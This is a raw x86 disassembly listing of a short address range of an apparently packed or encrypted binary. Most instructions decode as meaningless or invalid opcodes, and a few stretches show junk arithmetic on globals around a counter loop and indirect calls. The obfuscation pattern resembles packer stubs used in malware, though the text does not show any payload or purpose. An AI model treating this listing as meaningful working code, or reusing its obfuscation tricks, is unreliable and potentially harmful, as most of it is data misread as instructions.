  40717e:	mov    al,ds:0xb77cc4d6
  407183:	retf   
  407184:	mov    al,0x43
  407186:	fstp   TBYTE PTR [edi]
  407188:	mov    ebp,0x8bdd7598
  40718d:	(bad)  
  40718e:	or     DWORD PTR [edx],edi
  407190:	loopne 0x407162
  407192:	cdq    
  407193:	jo     0x407166
  407195:	stos   BYTE PTR es:[edi],al
  407196:	inc    esp
  407197:	fnstsw ax
  407199:	push   edi
  40719a:	lock (bad) 
  40719c:	sti    
  40719d:	lock clc 
  40719f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071a0:	push   esi
  4071a1:	nop
  4071a2:	jbe    0x4071c6
  4071a4:	adc    bh,BYTE PTR ds:0xefee99c3
  4071aa:	push   0x94f3b17d
  4071af:	fsubrp st(7),st
  4071b1:	sub    BYTE PTR [eax+edi*1-0x30a8bcfd],dh
  4071b8:	adc    ebp,DWORD PTR [edx]
  4071ba:	sub    eax,0x9d09b41f
  4071bf:	add    al,0x75
  4071c1:	imul   eax,ecx,0x1b12fd25
  4071c7:	and    eax,0x903b08d0
  4071cc:	mov    ebx,0x9c592a74
  4071d1:	leave  
  4071d2:	test   dh,0x21
  4071d5:	dec    ebp
  4071d6:	push   esi
  4071d7:	cli    
  4071d8:	lea    esp,[ebx]
  4071da:	out    0xa,al
  4071dc:	or     BYTE PTR [edi+0x6f2ba140],ch
  4071e2:	test   al,0xf7
  4071e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071e5:	xor    al,0x56
  4071e7:	call   0xbad0:0x1df49190
  4071ee:	stc    
  4071ef:	test   BYTE PTR [edx+0xc],ch
  4071f2:	loop   0x4071f7
  4071f4:	in     eax,0x5c
  4071f6:	mov    ch,BYTE PTR [esi+ecx*1-0x6e]
  4071fa:	aad    0x4e
  4071fc:	xchg   edx,eax
  4071fd:	push   ebx
  4071fe:	test   BYTE PTR [ebp+0x77d59051],al
  407204:	aad    0x5d
  407206:	pop    edi
  407207:	popa   
  407208:	adc    BYTE PTR [ebx+0x79],dh
  40720b:	jle    0x4071e6
  40720d:	inc    edi
  40720e:	or     eax,0xad6a83ce
  407213:	repnz push esi
  407215:	jbe    0x4071ea
  407217:	pop    esi
  407218:	inc    edi
  407219:	mov    edx,0x4ed22d3
  40721e:	les    eax,FWORD PTR [esi-0x6a]
  407221:	mov    ss,WORD PTR [ecx*2+0x54ca3de6]
  407228:	into   
  407229:	out    dx,eax
  40722a:	stos   BYTE PTR es:[edi],al
  40722b:	ficom  DWORD PTR [ecx+eiz*2-0x5349d4cc]
  407233:	aam    0x8a
  407235:	in     al,dx
  407236:	sub    BYTE PTR [ebx-0x4f],dh
  407239:	xchg   ecx,eax
  40723a:	push   eax
  40723b:	jp     0x4071cd
  40723d:	data16 mov BYTE PTR [esi],bl
  407240:	sti    
  407241:	sbb    dh,BYTE PTR [edx+0x34]
  407244:	div    BYTE PTR [esi-0x1f]
  407247:	push   ds
  407248:	call   0xe953:0xb3ef6578
  40724f:	cmp    al,0x34
  407251:	xchg   esp,esi
  407253:	push   ebp
  407254:	adc    eax,0xaa1bd97e
  40725a:	outs   dx,BYTE PTR ds:[esi]
  40725b:	pop    ecx
  40725c:	add    ch,BYTE PTR [ecx+0x2f]
  40725f:	mov    esi,0x11790f0
  407264:	adc    al,0xef
  407266:	out    dx,eax
  407267:	and    al,0x70
  407269:	or     al,0xb4
  40726b:	gs out 0x64,eax
  40726e:	pop    ds
  40726f:	ret    
  407270:	push   ebp
  407271:	mov    dl,0x2
  407273:	mov    ecx,0xbad99204
  407278:	adc    eax,0xdf5f4ca5
  40727d:	call   0xe426:0xed5f1eb2
  407284:	jo     0x407275
  407286:	je     0x4072d2
  407288:	pop    eax
  407289:	sub    BYTE PTR [edx],ah
  40728b:	xchg   edi,eax
  40728c:	sbb    al,0xe3
  40728e:	cmp    al,0x7
  407290:	add    ecx,DWORD PTR [ebx+0x74]
  407293:	mov    ecx,0x68f8613a
  407298:	adc    BYTE PTR [ebp+edi*8+0x4f],cl
  40729c:	push   ebp
  40729d:	data16 jle 0x407299
  4072a0:	aam    0x17
  4072a2:	mov    eax,0x3ae32d8c
  4072a7:	mov    ch,0x16
  4072a9:	es pop ds
  4072ab:	cmc    
  4072ac:	gs loope 0x4072d7
  4072af:	jbe    0x407305
  4072b1:	and    ecx,DWORD PTR [esi+0x67297d98]
  4072b7:	xor    eax,0x36e8cc7c
  4072bc:	adc    BYTE PTR [ebx],cl
  4072be:	daa    
  4072bf:	xchg   edx,eax
  4072c0:	int3   
  4072c1:	sub    al,al
  4072c3:	sub    esi,esi
  4072c5:	shr    BYTE PTR [esp+eax*8-0x42969b8b],0xe3
  4072cd:	mov    DWORD PTR [eax],esp
  4072cf:	jo     0x40726e
  4072d1:	loope  0x407268
  4072d3:	add    DWORD PTR [edi-0x17ae9556],ebp
  4072d9:	cmp    ebp,DWORD PTR [eax+0x4]
  4072dc:	ret    
  4072dd:	xor    BYTE PTR [ebp-0x1b78fea1],ch
  4072e3:	cmc    
  4072e4:	je     0x407296
  4072e6:	scas   al,BYTE PTR es:[edi]
  4072e7:	adc    esi,DWORD PTR [ecx+0x2e52854b]
  4072ed:	xchg   edx,eax
  4072ee:	mov    al,ds:0x4b4b8d65
  4072f3:	xor    eax,0x2b3867bf
  4072f8:	nop
  4072f9:	mov    ebp,0xbec03291
  4072fe:	repz and DWORD PTR [eax-0x49b8bf5],edx
  407305:	and    al,0x9c
  407307:	sub    al,0x5f
  40730a:	addr16 or eax,0xd3fdb8ac
  407310:	pop    ds
  407311:	cmp    BYTE PTR [ebx-0x4a],0x85
  407315:	mov    ecx,0x9651198f
  40731a:	dec    ebp
  40731b:	aad    0x89
  40731d:	fld    DWORD PTR [eax]
  40731f:	mov    al,ds:0xdc455168
  407324:	ret    0xc86
  407327:	daa    
  407328:	mov    cl,0x6f
  40732a:	nop
  40732b:	jnp    0x4072cf
  40732d:	jle    0x4072b1
  40732f:	push   0xffffffb2
  407331:	mov    ds:0x4a6c44a2,al
  407336:	or     ch,bh
  407338:	lock sahf 
  40733a:	pusha  
  40733b:	mov    al,ds:0x961b3023
  407340:	push   esp
  407341:	dec    ebx
  407342:	jne    0x407394
  407344:	test   ebp,esp
  407346:	pop    ds
  407347:	mov    eax,DWORD PTR [ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fcd1,0x42e703
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fcfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e70f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	mov    esp,0xf7462d90
  407400:	iret   
  407401:	jo     0x407473
  407403:	and    BYTE PTR [ebp+0x70],bh
  407406:	jo     0x4073d8
  407408:	fimul  WORD PTR [edi]
  40740a:	je     0x40741b
  40740c:	div    DWORD PTR ds:0xdc02d392
  407412:	mov    BYTE PTR [ecx+0x38],ch
  407415:	inc    esi
  407417:	adc    dl,dh
  407419:	jb     0x407490
  40741b:	das    
  40741c:	popa   
  40741d:	sub    al,0x23
  40741f:	pop    edi
  407420:	ja     0x407437
  407422:	pop    es
  407423:	iret   
  407424:	outs   dx,DWORD PTR ds:[esi]
  407425:	push   edi
  407426:	and    al,0xae
  407428:	lock ja 0x407478
  40742b:	jge    0x40745d
  40742d:	dec    DWORD PTR [ecx]
  40742f:	icebp  
  407430:	inc    esp
  407431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407432:	mov    bh,0xa4
  407434:	dec    edx
  407435:	loopne 0x4073f8
  407437:	neg    DWORD PTR [edi+ecx*2]
  40743a:	adc    DWORD PTR [eax+0x312722f5],0x6a
  407441:	icebp  
  407442:	xor    edi,DWORD PTR [ebp+0x1c1c651e]
  407448:	and    DWORD PTR [eax+0x73b0cc5f],edi
  40744e:	push   eax
  40744f:	pop    ecx
  407450:	jge    0x407437
  407452:	sbb    BYTE PTR [ecx-0x4a58c6c9],bl
  407458:	sub    bh,al
  40745a:	xlat   BYTE PTR ds:[ebx]
  40745b:	push   ecx
  40745c:	aas    
  40745d:	and    BYTE PTR [edi+eax*8-0x650df6fa],0x4a
  407465:	sar    BYTE PTR [esi],0xf7
  407468:	and    BYTE PTR [eax+ecx*8],bh
  40746b:	mov    bh,0x20
  40746d:	pop    edi
  40746e:	int    0xa
  407470:	jns    0x407474
  407472:	cmp    eax,0x7c92594e
  407477:	jmp    0x57bb2b6d
  40747c:	fild   DWORD PTR [edi-0x5c]
  40747f:	inc    esp
  407480:	add    BYTE PTR [esp+eiz*8-0x1e],al
  407484:	jnp    0x407430
  407486:	cli    
  407487:	xchg   ebx,eax
  407488:	test   al,0x1a
  40748a:	mov    ch,0x84
  40748c:	add    eax,0xe0895cba
  407491:	loope  0x40742b
  407493:	mov    al,ds:0xd10b062
  407498:	or     BYTE PTR [esi+edi*2],bh
  40749b:	(bad)  
  40749c:	shl    bl,1
  40749e:	xor    BYTE PTR [edi],ch
  4074a0:	ins    BYTE PTR es:[edi],dx
  4074a1:	enter  0x1633,0xf6
  4074a5:	pop    es
  4074a6:	pop    edx
  4074a7:	jne    0x4074f3
  4074a9:	scas   eax,DWORD PTR es:[edi]
  4074aa:	ins    DWORD PTR es:[edi],dx
  4074ab:	sub    al,0xef
  4074ad:	bound  ebp,QWORD PTR [esi+edi*1]
  4074b0:	jne    0x40752b
  4074b2:	push   ecx
  4074b3:	sar    DWORD PTR [eax],0x69
  4074b6:	cmp    dh,dl
  4074b8:	rcr    BYTE PTR [ecx+0x43],0xc
  4074bc:	ja     0x40744b
  4074be:	add    eax,0xe77ef34f
  4074c3:	rol    BYTE PTR [esi+0x3b],0xa9
  4074c7:	push   eax
  4074c8:	pop    es
  4074c9:	mov    ebx,ecx
  4074cb:	and    eax,0x34dd3efb
  4074d0:	cmc    
  4074d1:	mov    ds:0xfafdd4a6,al
  4074d6:	xchg   esp,eax
  4074d7:	out    dx,eax
  4074d8:	das    
  4074d9:	repz fimul DWORD PTR [edi+0x32]
  4074dd:	retf   
  4074de:	sbb    ecx,DWORD PTR [edi-0x45]
  4074e1:	push   ecx
  4074e2:	daa    
  4074e3:	push   ebx
  4074e4:	add    edx,DWORD PTR [eax-0x2f4ba3b0]
  4074ea:	(bad)  
  4074eb:	out    dx,eax
  4074ec:	ror    BYTE PTR [ebx-0x28],cl
  4074ef:	jb     0x40751c
  4074f1:	mov    dl,0x6f
  4074f3:	pop    ds
  4074f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074f5:	int    0x19
  4074f7:	daa    
  4074f8:	stos   DWORD PTR es:[edi],eax
  4074f9:	sbb    DWORD PTR [ecx],ebx
  4074fb:	das    
  4074fc:	lock xor eax,0x28babfbc
  407502:	rol    DWORD PTR [ebx+ecx*1+0x10],0x6b
  407507:	jmp    0xed49:0x34d1c679
  40750e:	cmp    esp,DWORD PTR [edi+ebx*1+0x61]
  407512:	gs sub cl,0xc7
  407516:	push   ecx
  407517:	adc    ch,bh
  407519:	mov    al,0xd3
  40751b:	(bad)  
  40751c:	pop    esi
  40751d:	mov    dl,0xdd
  40751f:	in     al,0x3c
  407521:	(bad)  
  407522:	inc    ebp
  407523:	sbb    eax,0x6793bec2
  407528:	push   es
  407529:	pop    edx
  40752a:	jl     0x40755c
  40752c:	push   edx
  40752d:	sbb    eax,0xa0934ffb
  407532:	call   0x9664:0xe42ffcae
  407539:	retf   
  40753a:	push   eax
  40753b:	in     al,dx
  40753c:	shr    ebp,cl
  40753e:	cdq    
  40753f:	add    eax,0x1d9048ea
  407544:	std    
  407545:	(bad)  
  407546:	sbb    al,0xbb
  407548:	clc    
  407549:	adc    DWORD PTR [esi-0x7eba6fe],0xffffffbe
  407550:	dec    edx
  407551:	addr16 dec esp
  407553:	repnz pop ds
  407555:	out    dx,eax
  407556:	mov    ecx,0x6d1a1d95
  40755b:	dec    BYTE PTR [si+0x5b09]
  407560:	mov    edx,DWORD PTR [ecx+esi*1-0x13]
  407564:	push   edx
  407565:	pop    eax
  407566:	pop    edx
  407567:	cmc    
  407568:	test   BYTE PTR [ebx+0xb],ch
  40756b:	adc    al,0xc2
  40756d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40756e:	jbe    0x4075e5
  407570:	ret    
  407571:	dec    eax
  407572:	cmp    al,0x7e
  407574:	popa   
  407575:	mov    eax,ds:0x431b13fc
  40757a:	aas    
  40757b:	xchg   esi,edx
  40757d:	cmp    al,cl
  40757f:	push   ebp
  407580:	add    al,0x3
  407582:	jno    0x407560
  407584:	nop
  407585:	cmc    
  407586:	mov    ebx,0xdea375ad
  40758b:	jmp    0xaa13af2
  407590:	and    al,0x53
  407592:	and    al,0x53
  407594:	jl     0x4075b3
  407596:	sub    ch,ch
  407598:	cmp    al,dl
  40759a:	xchg   edi,eax
  40759b:	outs   dx,BYTE PTR ds:[esi]
  40759c:	add    DWORD PTR [edx-0x520b17c5],ecx
  4075a2:	out    0x37,eax
  4075a4:	enter  0xe884,0x76
  4075a8:	jmp    0x407544
  4075aa:	jg     0x40760d
  4075ac:	mov    ch,0x20
  4075ae:	test   edx,esp
  4075b0:	dec    ebp
  4075b1:	fisttp QWORD PTR [esi]
  4075b3:	(bad)  
  4075b4:	mov    bh,0xd5
  4075b6:	xor    al,0x11
  4075b8:	daa    
  4075b9:	ret    
  4075ba:	jo     0x4075ff
  4075bc:	jb     0x407598
  4075be:	inc    esi
  4075bf:	xchg   esp,eax
  4075c0:	inc    esp
  4075c1:	nop
  4075c2:	dec    ecx
  4075c3:	hlt    
  4075c4:	inc    edi
  4075c5:	sbb    eax,0x369020b7
  4075ca:	call   0x71c2:0x70a9a9cd
  4075d1:	jbe    0x407597
  4075d3:	push   ebp
  4075d4:	stc    
  4075d5:	aaa    
  4075d6:	xchg   BYTE PTR [ebx],dh
  4075d8:	call   FWORD PTR [ebp+0x3c3ad70f]
  4075de:	push   esi
  4075df:	daa    
  4075e0:	inc    eax
  4075e1:	pop    edi
  4075e2:	fcomp  st(6)
  4075e4:	mov    edi,DWORD PTR [ebp+0x56afa5]
  4075ea:	in     al,0xf8
  4075ec:	loopne 0x40757b
  4075ee:	neg    DWORD PTR [eax+0x7f]
  4075f1:	retf   0xb25c
  4075f4:	sub    al,0xca
  4075f6:	adc    DWORD PTR [ebx+0x6bbe8dee],0xc6d0aa0d
  407600:	mov    eax,DWORD PTR [edi-0x4f]
  407603:	mov    cl,BYTE PTR [ebx]
  407605:	pop    ebp
  407606:	sbb    eax,0x900cdaf3
  40760b:	sbb    dh,BYTE PTR gs:[esi+0x67]
  40760f:	out    0x34,al
  407611:	out    dx,eax
  407612:	xchg   esp,eax
  407613:	mov    bh,0x62
  407615:	and    edx,DWORD PTR [esi-0x1cf5cc62]
  40761b:	push   esi
  40761c:	adc    ebp,ebx
  40761e:	and    DWORD PTR [ecx],esi
  407620:	add    eax,0xff0948f5
  407625:	in     eax,dx
  407626:	(bad)  
  407627:	das    
  407628:	pusha  
  407629:	iret   
  40762a:	xchg   esp,eax
  40762b:	push   DWORD PTR [ebx-0x5b]
  40762e:	add    cl,al
  407630:	jge    0x4075cd
  407632:	push   ecx
  407633:	xchg   ebp,eax
  407634:	pop    ds
  407635:	mov    ebx,0xedda70c1
  40763a:	jmp    0x4075f4
  40763c:	jl     0x4076ad
  40763e:	jno    0x407604
  407640:	xchg   BYTE PTR [edi+0x6abee3b6],bh
  407646:	add    BYTE PTR [esi+0x10],bl
  407649:	cmp    al,0xa4
  40764b:	sub    esp,ecx
  40764d:	push   edx
  40764e:	jb     0x40769a
  407650:	mov    ecx,esp
  407652:	jecxz  0x4076ce
  407654:	lock pop edx
  407656:	cmp    bl,bl
  407658:	dec    esp
  407659:	stc    
  40765a:	imul   ebp,DWORD PTR [edx],0x4b
  40765d:	ss sub eax,0xcb224566
  407663:	mov    ds:0xd910c612,eax
  407668:	add    esp,DWORD PTR ds:0x7c78605b
  40766e:	scas   al,BYTE PTR es:[edi]
  40766f:	add    al,0x10
  407671:	push   ss
  407672:	inc    ebx
  407673:	ins    BYTE PTR es:[edi],dx
  407674:	xchg   ecx,eax
  407675:	push   ebx
  407676:	cmp    esp,DWORD PTR [eax-0x3b]
  407679:	adc    BYTE PTR [eax+0x35cbb629],bh
  40767f:	xor    al,0x1
  407681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407682:	pop    esp
  407683:	xor    BYTE PTR [ebp-0x566896be],0x34
  40768a:	adc    BYTE PTR [ebx-0x14dde411],dh
  407690:	mov    ah,0xc2
  407692:	(bad)  
  407693:	jg     0x407711
  407695:	adc    cl,BYTE PTR [edx+0x3b]
  407698:	das    
  407699:	add    DWORD PTR [edx+ecx*8],edi
  40769c:	mov    edx,DWORD PTR [eax+0x4ec78eec]
  4076a2:	jnp    0x4076b5
  4076a4:	sub    ch,bl
  4076a6:	div    DWORD PTR [edx-0x121a1385]
  4076ac:	xor    ch,BYTE PTR fs:[ecx-0x49]
  4076b0:	daa    
  4076b1:	inc    ebx
  4076b2:	cmp    edi,eax
  4076b4:	mov    esp,DWORD PTR [esi-0x4907e533]
  4076ba:	mov    esi,0x8a40a071
  4076bf:	fbld   TBYTE PTR [eax+0x4a8a222d]
  4076c5:	mov    edx,0xaf1751d4
  4076ca:	cmp    DWORD PTR [esp+edx*8-0xd3a64a9],eax
  4076d1:	mov    BYTE PTR [edi-0x7bcec724],dh
  4076d7:	jns    0x4076e8
  4076d9:	aaa    
  4076da:	stos   BYTE PTR es:[edi],al
  4076db:	dec    eax
  4076dc:	inc    ecx
  4076dd:	sahf   
  4076de:	xchg   edi,eax
  4076df:	push   esp
  4076e0:	lock out dx,eax
  4076e2:	jp     0x407671
  4076e4:	sbb    DWORD PTR [edx+edi*4+0xd],ebp
  4076e8:	mov    BYTE PTR [edx],al
  4076ea:	pop    es
  4076eb:	jl     0x407757
  4076ed:	fidiv  WORD PTR [eax+0x10]
  4076f0:	fbld   TBYTE PTR [eax-0x6c3c80d9]
  4076f6:	jge    0x407770
  4076f8:	mov    al,0x23
  4076fa:	push   edx
  4076fb:	jns    0x407730
  4076fd:	or     ecx,DWORD PTR [eax+edi*1]
  407700:	dec    ebx
  407701:	stc    
  407702:	lods   al,BYTE PTR ds:[esi]
  407703:	jmp    0xcdc747f0
  407708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407709:	lock rep outs dx,BYTE PTR ds:[esi]
  40770c:	enter  0xc0ae,0x20
  407710:	xchg   ecx,eax
  407711:	in     al,dx
  407712:	lahf   
  407713:	mov    ecx,0x6899dfe4
  407718:	push   0xffffffca
  40771a:	shl    DWORD PTR [esi],0xdb
  40771d:	jecxz  0x4076cd
  40771f:	sbb    eax,0x59c345d3
  407724:	jnp    0x4076fb
  407726:	out    dx,al
  407727:	sbb    bh,bh
  407729:	lahf   
  40772a:	in     eax,dx
  40772b:	fs push 0x1e995420
  407731:	and    dl,BYTE PTR [edi+edx*1-0x74d139dc]
  407738:	inc    ebp
  407739:	fdiv   QWORD PTR [ebx]
  40773b:	mov    BYTE PTR [ebx],0xc7
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	out    0xa8,al
  4077db:	fistp  WORD PTR [edi+eiz*4+0x207070cc]
  4077e2:	jge    0x407854
  4077e4:	jo     0x4077cb
  4077e6:	cs mov dh,0xb6
  4077e9:	xchg   ebx,eax
  4077ea:	xor    DWORD PTR [ebx-0x29],esp
  4077ed:	scas   al,BYTE PTR es:[edi]
  4077ee:	call   DWORD PTR [ecx+0x63]
  4077f1:	retf   
  4077f2:	pop    ss
  4077f3:	dec    esi
  4077f4:	fs jbe 0x407838
  4077f7:	mov    esp,eax
  4077f9:	sub    edx,DWORD PTR [ecx+0x61]
  4077fc:	cwde   
  4077fd:	shl    DWORD PTR [edi],1
  4077ff:	rol    BYTE PTR cs:[edx],0x64
  407803:	idiv   DWORD PTR [ebx-0x67e5ac57]
  407809:	mov    dl,BYTE PTR [ebp+0x3a1b0c81]
  40780f:	int    0xa4
  407811:	hlt    
  407812:	xchg   BYTE PTR [esi+0x4aeee992],dh
  407818:	aad    0x65
  40781a:	inc    edi
  40781b:	(bad)  
  40781c:	sbb    eax,0x379b18dd
  407821:	push   0xffffffc6
  407823:	jge    0x40780a
  407825:	push   ss
  407826:	data16 and al,0x3e
  407829:	jg     0x407821
  40782b:	nop
  40782c:	in     al,0x6d
  40782e:	mov    esi,0x77acf213
  407833:	push   0xffffffc1
  407835:	jmp    0xc1776ed7
  40783a:	pop    ebp
  40783b:	inc    esi
  40783c:	jg     0x40787c
  40783e:	add    eax,0xc1b6a46d
  407843:	retf   0xf163
  407846:	or     ebp,edi
  407848:	pop    edi
  407849:	shl    edi,cl
  40784b:	test   DWORD PTR [esi],ebp
  40784d:	inc    ecx
  40784f:	push   0x943bb0ce
  407854:	dec    eax
  407855:	lea    esi,[ecx-0x326b1425]
  40785b:	scas   al,BYTE PTR es:[edi]
  40785c:	add    ecx,DWORD PTR [edi]
  40785e:	mov    ch,0x24
  407860:	adc    edi,ecx
  407862:	iret   
  407863:	jge    0x40786b
  407865:	xor    al,0xe9
  407867:	cli    
  407868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407869:	adc    eax,DWORD PTR [edx*8+0x7b42b331]
  407870:	sub    al,0xb
  407872:	mov    ch,0x26
  407874:	xchg   DWORD PTR [eax+ecx*8],ebx
  407877:	mov    bl,0xb4
  407879:	mov    ecx,DWORD PTR [edi-0x3a6d96f0]
  40787f:	rcl    BYTE PTR [ebx+0x7823e390],cl
  407885:	adc    DWORD PTR gs:[ebp+0x61],edi
  407889:	mov    ds:0xc48f07d0,al
  40788e:	sub    al,cl
  407890:	addr16 dec esi
  407892:	xchg   ebp,eax
  407893:	out    dx,eax
  407894:	mov    edi,0xab5a341b
  407899:	retf   0x3146
  40789c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40789d:	xlat   BYTE PTR ds:[ebx]
  40789e:	dec    ecx
  40789f:	push   0xc796460
  4078a4:	icebp  
  4078a5:	js     0x4078b1
  4078a7:	pop    edi
  4078a8:	iret   
  4078a9:	fst    DWORD PTR [ecx*2+0x4510f291]
  4078b0:	lds    esi,FWORD PTR [esp+ebx*8+0x46405884]
  4078b7:	pushf  
  4078b8:	sbb    al,0x8d
  4078ba:	adc    BYTE PTR [edi],al
  4078bc:	pop    ecx
  4078bd:	mov    al,ds:0x92676157
  4078c2:	or     dh,BYTE PTR [ecx-0x66d56551]
  4078c8:	loopne 0x4078c3
  4078ca:	mov    eax,ds:0x393c7c7d
  4078cf:	sub    al,bh
  4078d1:	push   edi
  4078d2:	pop    esi
  4078d3:	leave  
  4078d4:	jno    0x4078d5
  4078d6:	fwait
  4078d7:	pop    esp
  4078d8:	mov    al,0xdf
  4078da:	mov    bh,0x45
  4078dc:	inc    edi
  4078dd:	pushf  
  4078de:	mov    edi,0xab9913ec
  4078e3:	mov    bh,0x7e
  4078e5:	dec    esp
  4078e6:	cmc    
  4078e7:	mov    ah,0xc
  4078e9:	fstp   st(4)
  4078eb:	int    0x56
  4078ed:	inc    ebx
  4078ee:	into   
  4078ef:	(bad)  
  4078f0:	aad    0x9b
  4078f2:	outs   dx,BYTE PTR ds:[esi]
  4078f3:	scas   al,BYTE PTR es:[edi]
  4078f4:	mov    dl,0xcb
  4078f6:	add    eax,ecx
  4078f8:	enter  0x7e68,0x5c
  4078fc:	aaa    
  4078fd:	sub    esi,ebp
  4078ff:	lahf   
  407900:	dec    edx
  407901:	scas   eax,DWORD PTR es:[edi]
  407902:	mov    bh,0x1
  407904:	mov    ss,WORD PTR [edx]
  407906:	dec    ebx
  407907:	dec    edi
  407908:	push   ebx
  407909:	and    BYTE PTR [esi+0x3],dl
  40790c:	push   ecx
  40790d:	cmc    
  40790e:	mov    ecx,0x37d406ea
  407913:	pusha  
  407914:	pusha  
  407915:	ds pusha 
  407917:	pop    ebp
  407918:	loop   0x40795c
  40791a:	test   al,0x8e
  40791c:	pusha  
  40791d:	or     ebx,DWORD PTR [esi]
  40791f:	mov    esp,0xffd5f4ab
  407924:	nop
  407925:	adc    DWORD PTR [edi+0x35],ecx
  407928:	test   BYTE PTR [ebx],ch
  40792a:	dec    ecx
  40792b:	jl     0x407916
  40792d:	add    BYTE PTR [esi-0x2f134a92],dl
  407933:	jmp    0xa52f:0xda9a5155
  40793a:	call   0xca08adf1
  40793f:	xor    DWORD PTR [ebp-0x2a],esp
  407942:	aas    
  407943:	fld    DWORD PTR [edi]
  407945:	les    bx,DWORD PTR ds:[ebp+edx*4+0x39]
  40794b:	push   ebp
  40794c:	dec    eax
  40794d:	jnp    0x4078e0
  40794f:	mov    esp,0x525bade8
  407954:	fdivr  st,st(2)
  407956:	in     eax,dx
  407957:	push   es
  407958:	adc    BYTE PTR [edx+0x68b406c5],cl
  40795e:	and    ebp,0x32
  407961:	cdq    
  407962:	inc    edx
  407963:	iret   
  407964:	or     al,0x6f
  407966:	aad    0x85
  407968:	add    eax,DWORD PTR [edx+0x59]
  40796b:	jmp    0x77a4:0x55f49bfb
  407972:	aas    
  407973:	mov    al,ds:0xa73a8053
  407978:	ret    
  407979:	test   al,0x83
  40797b:	mov    ah,BYTE PTR [edi]
  40797d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40797e:	or     ecx,DWORD PTR [edx]
  407980:	dec    edx
  407981:	mov    ds:0x4ef9f885,al
  407986:	dec    edi
  407987:	aad    0x1b
  407989:	js     0x407961
  40798b:	pop    ebx
  40798c:	mov    esp,0xf8c9011b
  407991:	mov    edx,0x83b136f1
  407996:	je     0x407988
  407998:	(bad)  
  407999:	mov    ebp,0x3201cc08
  40799e:	outs   dx,BYTE PTR ds:[esi]
  40799f:	xchg   ebx,eax
  4079a0:	dec    esi
  4079a1:	pop    ebp
  4079a2:	push   edi
  4079a3:	daa    
  4079a4:	cld    
  4079a5:	sbb    al,0xea
  4079a7:	jns    0x4079f6
  4079a9:	mov    esp,0x7db68818
  4079ae:	call   DWORD PTR [edx-0x20e694c1]
  4079b4:	jecxz  0x407993
  4079b6:	cdq    
  4079b7:	fadd   QWORD PTR [ebp+0x4540c8d0]
  4079bd:	rcr    BYTE PTR [ebx+eax*4],0x96
  4079c1:	sub    ch,cl
  4079c3:	inc    eax
  4079c4:	cmp    BYTE PTR [edi],bl
  4079c6:	lahf   
  4079c7:	ds pop ss
  4079c9:	fs es jmp 0x4079ef
  4079cd:	in     eax,dx
  4079ce:	mov    edi,0x45f1fbd
  4079d3:	dec    ecx
  4079d4:	mov    ebx,0xb8c05371
  4079d9:	adc    DWORD PTR [esi],eax
  4079db:	lds    eax,FWORD PTR [eax]
  4079dd:	sti    
  4079de:	sti    
  4079df:	hlt    
